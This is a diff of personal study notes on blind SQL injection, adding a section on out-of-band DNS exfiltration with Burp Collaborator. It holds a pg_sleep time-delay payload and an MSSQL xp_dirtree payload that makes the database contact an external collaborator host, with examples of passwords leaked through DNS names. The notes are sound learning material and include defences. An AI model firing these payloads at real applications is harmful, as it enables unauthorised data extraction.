@@ -732,11 +732,11 @@ Check if response is delayed or not:
 this means :
 ```
 trackingId = x';   
-                SELECT CASE     
-                WHEN (1=1)  
-                THEN pg_sleep(10)   
-                ELSE pg_sleep(0)   
-                END--;
+            SELECT CASE     
+            WHEN (1=1)  
+            THEN pg_sleep(10)   
+            ELSE pg_sleep(0)   
+            END--;
 ```
 
 #### Database and sleep function:
@@ -784,3 +784,152 @@ By default, Intruder sends many requests in parallel.
 - reliable true/false detection.
 
     Each response time directly maps to one injected condition.
+
+### Exploiting blind SQL injection using out-of-band (OAST) techniques
+
+`OAST` - Out-of-band Application Secuirty Testing 
+
+**In-band** = data comeback in the HTTP response.  
+**Out-of-band** = data goes to different channel. 
+
+Application does ***asynchonous SQL query*** operations.  
+eg- app process users request in original thread and uses other thread to execute the attackers SQL query.  
+
+```
+User request ──> App response returned immediately
+                    │
+                    └──> Background SQL query (vulnerable)
+                             └──> DNS request (leaks data)
+```
+The HTTP response is ***decoupled*** from the SQL query.
+
+In this case the app response dont depend on:  
+1. returning any data
+2. database error
+3. time delay detections.
+
+#### Key idea:
+If you **can’t** get data back through the **response**,  
+make the database **send data somewhere to your server**.
+
+```
+In this case one can exploit blind SQLi vulnerability by trigger OUT-OF-BAND network interactions to a system that one control.
+```
+
+Example of Out-of-band channels:
+- DNS requests
+- HTTP request
+- ICMP (ping)
+- SMTP (ping)
+
+The web app never shows you anything —but you **observe the traffic elsewhere.**
+
+#### Most effective protocol - **`DNS`**  
+
+***why?***
+- almost always allowed out-of-band
+- work even in lock-down network
+- lightweight and reliable
+- easy to monitor
+
+**Most production environement:**
+- block outbound HTTP
+- block ICMP
+- allows DNS query
+
+#### How data is inferred or exfiltrated:
+1. **Conditional inference** (true/false):  
+    > If the condtion is true, cause DNS lookup
+
+    if you see DNS request - condiiton = true  
+    else = false
+
+    This lets you extract data **bit by bit**.
+
+2. **Direct data exfiltration** (powerful):
+    ```
+    encode data into DNS request
+    send it out in one go
+    ```
+    example - 
+    > password.admin.example.com
+
+    See this request hit your sever:
+    - recieved the password
+    - no change in page. error, time delay
+
+#### Where OAST is commonly seen?
+- Analytics / tracking cookies
+- Background logging systems
+- Asynchronous audit trails
+- Message queues
+-Event-driven microservices
+
+These are **very common in real apps**.
+
+#### Why this vulnerabilty exist:
+- SQL injection still possible
+- DB can make out bound network calls
+- Egress traffic not restricted.
+
+#### Resolution:
+- Parameterized queries
+- disable DB's network access
+- egress filtering (DNS/HTTP)
+- Monitor unexpected DNS patterns
+
+#### Most reliable tool for OAST:
+
+`Burp collaborator`    
+
+- A server 
+- provides custom implemenation of network services (eg-DNS)
+- it show when network interaction occured as a result of sending indiviual payload to the vulnerable app.
+
+When the app won’t talk to you directly, Collaborator tells you whether it talked to anything else. 
+
+App or its DB makes backgroud network request.  
+`Collaborator` enable you to see those requests.
+
+`collaborator` is a controlled external service that:
+1. recieve **DNS, HTTP, HTTPS, SMTP** etc interactions.
+2. logs **who contacted it**
+3. logs **what data was sent**
+4. tells exactly what happened.
+```
+A public dropbox that reports back every time the target system touches it.
+```
+ **1. Conditional data inference:**
+> condition 
+
+true -> trigger DNS request.  
+false -> do nothing  
+
+in `Collaborator`:  
+request seen -> true  
+no request -> false
+
+**2. Direct data exfiltration:**  
+
+The database can embed data ***inside the request***
+> <leaked-data>.collaborator-domain
+
+`Collaborator` logs:
+> adminpassword123.xyz.collaborator.net
+
+You didn’t infer the data — you **received it directly**.
+
+if `collaborator` shows interactions:
+- the app or DB reach the internet.
+- egress control are weak.
+- SQL inject can cause side effects. 
+
+#### Working:
+
+Techniques for triggering a DNS query are specific to the type of DB being used.
+
+**example** - Microsoft SQL server can be used to cause a DNS lookup on a specified domain:
+> '; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--
+
+This causes the database to perform a lookup for the following domain: 
+> 0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net
